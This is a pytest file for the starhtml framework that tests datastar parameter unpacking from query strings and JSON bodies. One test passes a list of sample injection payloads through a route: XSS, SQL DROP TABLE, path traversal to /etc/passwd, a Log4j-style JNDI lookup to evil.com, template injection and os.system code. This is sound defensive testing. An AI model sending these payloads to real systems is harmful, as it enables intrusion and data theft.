"""Tests for datastar parameter unpacking in _find_p"""

import json

import pytest
from starlette.testclient import TestClient

from starhtml import *


def test_datastar_unpacking_get_request():
    """Test unpacking datastar parameters from GET request query params"""
    app, rt = star_app()

    @rt("/test")
    def test_route(name: str, age: int):
        return f"Name: {name}, Age: {age}"

    client = TestClient(app)

    # Test with datastar query parameter
    datastar_data = {"name": "John", "age": 25}
    response = client.get(f"/test?datastar={json.dumps(datastar_data)}")
    assert response.status_code == 200
    assert response.text == "Name: John, Age: 25"


def test_datastar_unpacking_post_request():
    """Test unpacking datastar parameters from POST request body"""
    app, rt = star_app()

    @rt("/test")
    def test_route(req, name: str, email: str):
        return f"Name: {name}, Email: {email}"

    client = TestClient(app)

    # Test with datastar signals in body (with $ prefix)
    response = client.post(
        "/test", json={"$name": "Jane", "$email": "jane@example.com"}, headers={"Content-Type": "application/json"}
    )
    assert response.status_code == 200
    assert response.text == "Name: Jane, Email: jane@example.com"

    # Test without $ prefix
    response = client.post(
        "/test", json={"name": "Bob", "email": "bob@example.com"}, headers={"Content-Type": "application/json"}
    )
    assert response.status_code == 200
    assert response.text == "Name: Bob, Email: bob@example.com"


def test_datastar_unpacking_mixed_sources():
    """Test that regular parameter resolution still works alongside datastar"""
    app, rt = star_app()

    @rt("/test/{path_param}")
    def test_route(path_param: str, query_param: str, datastar_param: str):
        return f"Path: {path_param}, Query: {query_param}, Datastar: {datastar_param}"

    client = TestClient(app)

    # Mix of path, query, and datastar parameters
    datastar_data = {"datastar_param": "from_datastar"}
    response = client.get(f"/test/path_value?query_param=query_value&datastar={json.dumps(datastar_data)}")
    assert response.status_code == 200
    assert response.text == "Path: path_value, Query: query_value, Datastar: from_datastar"


def test_datastar_unpacking_disabled():
    """Test that datastar unpacking can be disabled"""
    app, rt = star_app(auto_unpack=False)

    @rt("/test")
    def test_route(name: str = "default"):
        return f"Name: {name}"

    client = TestClient(app)

    # With unpacking disabled, datastar params should not be found
    datastar_data = {"name": "John"}
    response = client.get(f"/test?datastar={json.dumps(datastar_data)}")
    assert response.status_code == 200
    assert response.text == "Name: default"  # Falls back to default


def test_datastar_unpacking_priority():
    """Test parameter resolution priority with datastar unpacking"""
    app, rt = star_app()

    @rt("/test")
    def test_route(param: str):
        return f"Param: {param}"

    client = TestClient(app)

    # Query param should have priority over datastar
    datastar_data = {"param": "from_datastar"}
    response = client.get(f"/test?param=from_query&datastar={json.dumps(datastar_data)}")
    assert response.status_code == 200
    assert response.text == "Param: from_query"

    # Datastar used when no query param
    response = client.get(f"/test?datastar={json.dumps(datastar_data)}")
    assert response.status_code == 200
    assert response.text == "Param: from_datastar"


def test_datastar_unpacking_invalid_json():
    """Test handling of invalid JSON in datastar parameter"""
    app, rt = star_app()

    @rt("/test")
    def test_route(param: str = "default"):
        return f"Param: {param}"

    client = TestClient(app)

    # Invalid JSON should be ignored
    response = client.get("/test?datastar=invalid{json}")
    assert response.status_code == 200
    assert response.text == "Param: default"


def test_datastar_unpacking_complex_signals():
    """Test unpacking with typical datastar signal patterns"""
    app, rt = star_app()

    @rt("/submit")
    def submit_route(name: str, email: str, age: int, newsletter: bool = False):
        return {"name": name, "email": email, "age": age, "newsletter": newsletter}

    client = TestClient(app)

    # Typical datastar POST with signals
    response = client.post(
        "/submit",
        json={
            "$name": "Alice",
            "$email": "alice@example.com",
            "$age": 30,
            "$newsletter": True,
            "$loading": False,  # Extra signal that's not a parameter
            "$status": "ready",  # Another extra signal
        },
        headers={"Content-Type": "application/json"},
    )
    assert response.status_code == 200
    data = response.json()
    assert data["name"] == "Alice"
    assert data["email"] == "alice@example.com"
    assert data["age"] == 30
    assert data["newsletter"] is True


def test_datastar_unpacking_form_data():
    """Test that regular form data still works as expected"""
    app, rt = star_app()

    @rt("/test")
    def test_route(name: str, email: str):
        return f"Name: {name}, Email: {email}"

    client = TestClient(app)

    # Regular form data should work normally
    response = client.post("/test", data={"name": "Form User", "email": "form@example.com"})
    assert response.status_code == 200
    assert response.text == "Name: Form User, Email: form@example.com"


def test_get_request_no_body_parsing():
    """Test GET request doesn't try to parse body"""
    app, rt = star_app()

    @rt("/test")
    def test_route(name: str = "default"):
        return f"Name: {name}"

    client = TestClient(app)
    # GET request should not attempt to parse body
    response = client.get("/test")
    assert response.status_code == 200
    assert response.text == "Name: default"


def test_post_empty_body_with_defaults():
    """Test POST with empty body uses parameter defaults"""
    app, rt = star_app()

    @rt("/test")
    def test_route(name: str = "default", age: int = 25):
        return {"name": name, "age": age}

    client = TestClient(app)
    # Empty POST should use defaults
    response = client.post("/test")
    assert response.status_code == 200
    assert response.json() == {"name": "default", "age": 25}


def test_put_empty_body_with_datastar():
    """Test PUT with empty body but datastar in query"""
    app, rt = star_app()

    @rt("/test", methods=["PUT"])
    def test_route(name: str):
        return f"Name: {name}"

    client = TestClient(app)
    # Empty PUT body but datastar in query should work
    datastar_data = {"name": "DatastarName"}
    response = client.put(f"/test?datastar={json.dumps(datastar_data)}")
    assert response.status_code == 200
    assert response.text == "Name: DatastarName"


def test_head_request_ignored():
    """Test HEAD request doesn't parse body or cause errors"""
    app, rt = star_app()

    @rt("/test")
    def test_route(name: str = "default"):
        return f"Name: {name}"

    client = TestClient(app)
    # HEAD request should work without parsing body
    response = client.head("/test")
    assert response.status_code == 200


def test_malformed_content_type():
    """Test request with malformed content-type header"""
    app, rt = star_app()

    @rt("/test")
    def test_route(name: str = "default"):
        return f"Name: {name}"

    client = TestClient(app)
    # Malformed content-type should be handled gracefully
    response = client.post("/test", data=b"", headers={"Content-Type": "application/json; charset=broken"})
    assert response.status_code == 200
    assert response.text == "Name: default"


def test_security_large_payload():
    """Test protection against large datastar payloads"""
    app, rt = star_app()

    @rt("/test")
    def test_route(param: str = "default"):
        return f"Param: {param}"

    client = TestClient(app)

    # Create a large payload (but not too large for test)
    large_value = "x" * 10000
    datastar_data = {"param": large_value}

    response = client.get(f"/test?datastar={json.dumps(datastar_data)}")
    assert response.status_code == 200
    # Should handle large values gracefully
    assert len(response.text) > 1000


def test_unicode_edge_cases():
    """Test various unicode scenarios"""
    app, rt = star_app()

    @rt("/test")
    def test_route(name: str, emoji: str = ""):
        return {"name": name, "emoji": emoji}

    client = TestClient(app)

    # Test with various unicode characters
    datastar_data = {
        "name": "测试用户",  # Chinese characters
        "emoji": "🚀💯🔥",  # Emojis
    }

    response = client.get(f"/test?datastar={json.dumps(datastar_data)}")
    assert response.status_code == 200
    result = response.json()
    assert result["name"] == "测试用户"
    assert result["emoji"] == "🚀💯🔥"


def test_none_vs_missing():
    """Test explicit None vs missing parameter"""
    app, rt = star_app()

    @rt("/test")
    def test_route(optional: str | None = "default"):
        return {"value": optional, "is_none": optional is None}

    client = TestClient(app)

    # Test explicit None
    response = client.get(f"/test?datastar={json.dumps({'optional': None})}")
    assert response.status_code == 200
    result = response.json()
    assert result["value"] is None
    assert result["is_none"] is True

    # Test missing parameter
    response = client.get("/test?datastar={}")
    assert response.status_code == 200
    result = response.json()
    assert result["value"] == "default"
    assert result["is_none"] is False


def test_deeply_nested_json():
    """Test protection against deeply nested JSON structures"""
    app, rt = star_app()

    @rt("/test")
    def test_route(param: str = "default"):
        return f"Param: {param}"

    client = TestClient(app)

    # Create a deeply nested structure
    deeply_nested = {"level1": {"level2": {"level3": {"level4": {"level5": {"param": "deep_value"}}}}}}

    # Should handle deeply nested structures gracefully
    response = client.get(f"/test?datastar={json.dumps(deeply_nested)}")
    assert response.status_code == 200
    # Since param is at top level of datastar, it won't be found
    assert response.text == "Param: default"

    # Test with param at top level
    data_with_param = {"param": "found", "nested": deeply_nested}
    response = client.get(f"/test?datastar={json.dumps(data_with_param)}")
    assert response.status_code == 200
    assert response.text == "Param: found"


def test_injection_attempts():
    """Test various injection attempts through datastar parameters"""
    app, rt = star_app()

    @rt("/test")
    def test_route(param: str = "safe"):
        # Ensure the parameter is properly escaped/handled
        return {"param": param, "length": len(param)}

    client = TestClient(app)

    # Test various injection attempts
    injection_tests = [
        {"param": "<script>alert('xss')</script>"},  # XSS attempt
        {"param": "'; DROP TABLE users; --"},  # SQL injection attempt
        {"param": "../../etc/passwd"},  # Path traversal
        {"param": "${jndi:ldap://evil.com/a}"},  # Log4j style
        {"param": "{{7*7}}"},  # Template injection
        {"param": "__import__('os').system('ls')"},  # Python code injection
    ]

    for test_data in injection_tests:
        response = client.get(f"/test?datastar={json.dumps(test_data)}")
        assert response.status_code == 200
        result = response.json()
        # The value should be passed through as-is (it's up to the app to sanitize)
        assert result["param"] == test_data["param"]
        assert result["length"] == len(test_data["param"])


def test_recursive_references():
    """Test handling of recursive/circular references in JSON"""
    app, rt = star_app()

    @rt("/test")
    def test_route(param: str = "default"):
        return {"param": param, "length": len(param)}

    client = TestClient(app)

    # Test various edge cases in GET requests (limited by URL length)
    get_test_cases = [
        '{"param": "value", "ref": {"$ref": "#"}}',  # JSON pointer attempt
        '{"param": "\\u0000"}',  # Null byte
        '{"param": "' + "x" * 1000 + '"}',  # Long string (but not too long for URL)
    ]

    for json_str in get_test_cases:
        response = client.get(f"/test?datastar={json_str}")
        assert response.status_code == 200
        # Should either parse successfully or fall back to default

    # Test very large payloads with POST
    @rt("/test-post", methods=["POST"])
    def test_post_route(param: str = "default"):
        return {"param": param[:50] + "..." if len(param) > 50 else param, "length": len(param)}

    # Test large POST payload
    large_value = "x" * 100000
    response = client.post("/test-post", json={"$param": large_value}, headers={"Content-Type": "application/json"})
    assert response.status_code == 200
    result = response.json()
    assert result["length"] == 100000
    assert result["param"].startswith("xxxx")


def test_concurrent_requests():
    """Test datastar unpacking under concurrent load"""
    from concurrent.futures import ThreadPoolExecutor

    app, rt = star_app()

    @rt("/concurrent")
    def concurrent_route(user_id: int, action: str):
        # Add small delay to increase chance of race conditions
        import time

        time.sleep(0.001)
        return {"user_id": user_id, "action": action}

    client = TestClient(app)

    def make_request(i):
        datastar_data = {"user_id": i, "action": f"action_{i}"}
        response = client.get(f"/concurrent?datastar={json.dumps(datastar_data)}")
        assert response.status_code == 200
        result = response.json()
        assert result["user_id"] == i
        assert result["action"] == f"action_{i}"
        return result

    # Make concurrent requests
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(make_request, i) for i in range(50)]
        results = [f.result() for f in futures]

    # Verify all requests were processed correctly
    assert len(results) == 50
    for i, result in enumerate(results):
        assert result["user_id"] == i
        assert result["action"] == f"action_{i}"


def test_type_conversions():
    """Test type conversions for datastar parameters"""

    app, rt = star_app()

    @rt("/types")
    def type_route(str_val: str, int_val: int, float_val: float, bool_val: bool, optional_val: str | None = None):
        return {
            "values": {
                "str_val": str_val,
                "int_val": int_val,
                "float_val": float_val,
                "bool_val": bool_val,
                "optional_val": optional_val,
            },
            "types": {
                "str": type(str_val).__name__,
                "int": type(int_val).__name__,
                "float": type(float_val).__name__,
                "bool": type(bool_val).__name__,
                "optional": type(optional_val).__name__ if optional_val is not None else "None",
            },
        }

    client = TestClient(app)

    # Test GET request with string values that need conversion
    response = client.get(
        f"/types?datastar={
            json.dumps(
                {
                    'str_val': 'hello',
                    'int_val': '42',
                    'float_val': '3.14',
                    'bool_val': 'true',
                    'optional_val': 'present',
                }
            )
        }"
    )
    assert response.status_code == 200
    result = response.json()

    # Check conversions worked
    assert result["values"]["str_val"] == "hello"
    assert result["values"]["int_val"] == 42
    assert result["values"]["float_val"] == 3.14
    assert result["values"]["bool_val"] is True
    assert result["values"]["optional_val"] == "present"

    # Check types
    assert result["types"]["str"] == "str"
    assert result["types"]["int"] == "int"
    assert result["types"]["float"] == "float"
    assert result["types"]["bool"] == "bool"
    assert result["types"]["optional"] == "str"

    # Test POST request with native JSON types
    @rt("/types", methods=["POST"])
    def type_route_post(str_val: str, int_val: int, float_val: float, bool_val: bool, optional_val: str | None = None):
        return type_route(str_val, int_val, float_val, bool_val, optional_val)

    response = client.post(
        "/types",
        json={"$str_val": "world", "$int_val": 99, "$float_val": 2.71, "$bool_val": False, "$optional_val": None},
        headers={"Content-Type": "application/json"},
    )
    assert response.status_code == 200
    result = response.json()

    # Check values
    assert result["values"]["str_val"] == "world"
    assert result["values"]["int_val"] == 99
    assert result["values"]["float_val"] == 2.71
    assert result["values"]["bool_val"] is False
    assert result["values"]["optional_val"] is None

    # Check None type
    assert result["types"]["optional"] == "None"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
